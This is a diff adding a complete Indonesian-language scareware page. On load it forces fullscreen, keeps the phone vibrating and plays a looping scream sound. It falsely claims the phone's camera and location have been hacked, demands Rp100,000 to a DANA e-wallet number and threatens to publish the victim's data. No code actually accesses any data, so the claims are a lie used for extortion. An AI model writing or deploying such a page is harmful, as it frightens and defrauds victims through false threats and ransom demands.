@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>HP TERSADAP</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      background-color: black;
+      color: red;
+      font-family: 'Courier New', Courier, monospace;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      text-align: center;
+      padding-top: 100px;
+      animation: glitch 0.3s infinite;
+    }
+
+    h1 {
+      font-size: 40px;
+      color: red;
+      text-shadow: 0 0 10px red;
+      animation: blink 1s infinite;
+    }
+
+    p {
+      font-size: 20px;
+      color: white;
+      margin-top: 20px;
+    }
+
+    .tebusan {
+      font-size: 24px;
+      color: red;
+      font-weight: bold;
+      margin-top: 30px;
+      animation: blink 0.7s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+
+    @keyframes glitch {
+      0% { transform: translate(1px, 1px); }
+      25% { transform: translate(-1px, 2px); }
+      50% { transform: translate(-3px, -1px); }
+      75% { transform: translate(2px, -2px); }
+      100% { transform: translate(0, 0); }
+    }
+
+    #hidden-msg {
+      position: fixed;
+      bottom: 10px;
+      width: 100%;
+      color: green;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body onload="goFullScreen(); startVibrate();">
+  <h1>📡 HP ANDA TELAH DI-SADAP 📡</h1>
+  <p>Kamera & lokasi Anda sudah kami akses!</p>
+  <p class="tebusan">Transfer Rp100.000 ke DANA: <strong>083102666966</strong></p>
+  <p>Jika tidak, seluruh data Anda akan dipublikasikan.</p>
+
+
+
+  <audio autoplay loop>
+    <source src="https://www.soundjay.com/human/screaming-woman-01.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+    function goFullScreen() {
+      const el = document.documentElement;
+      if (el.requestFullscreen) {
+        el.requestFullscreen();
+      } else if (el.webkitRequestFullscreen) {
+        el.webkitRequestFullscreen();
+      } else if (el.msRequestFullscreen) {
+        el.msRequestFullscreen();
+      }
+    }
+
+    function startVibrate() {
+      if ("vibrate" in navigator) {
+        setInterval(() => {
+          navigator.vibrate([500, 300, 500]);
+        }, 2000);
+      }
+    }
+  </script>
+</body>
+</html>
